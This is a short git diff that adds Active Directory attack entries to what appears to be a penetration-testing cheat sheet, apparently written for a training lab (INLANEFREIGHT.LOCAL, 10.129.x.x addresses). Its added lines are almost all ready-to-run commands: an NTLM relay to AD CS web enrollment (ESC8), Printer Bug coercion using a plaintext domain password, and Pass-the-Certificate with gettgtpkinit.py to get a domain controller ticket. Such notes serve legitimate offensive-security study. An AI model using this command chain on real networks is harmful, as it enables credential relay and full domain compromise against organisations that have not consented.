@@ -855,6 +855,30 @@ https://github.com/CiscoCXSecurity/linikatz
 $ ./linikatz.sh
 ```
 
+- AD CS NTLM Relay Attack (ESC8)
+
+```
+$ impacket-ntlmrelayx -t http://10.129.234.110/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication
+```
+
+- Printer Bug Exploitation
+
+```
+$ python3 printerbug.py INLANEFREIGHT.LOCAL/wwhite:"package5shores_topher1"@10.129.234.109 10.10.16.12
+```
+
+- Pass-The-Certificate (PTC)
+
+```
+https://github.com/dirkjanm/PKINITtools/blob/master/gettgtpkinit.py
+$ python3 -m venv .venv
+$ source .venv/bin/activate
+$ pip3 install -r requirements.txt
+# If you encounter error stating "Error detecting the version of libcrypto", it can be fixed by installing the oscrypto library
+$ pip3 install -I git+https://github.com/wbond/oscrypto.git
+$ python3 gettgtpkinit.py -cert-pfx ../krbrelayx/DC01\$.pfx -dc-ip 10.129.234.109 'inlanefreight.local/dc01$' /tmp/dc.ccache
+```
+
 #5. - Privilege Escalation
 -----------------------------------------
 
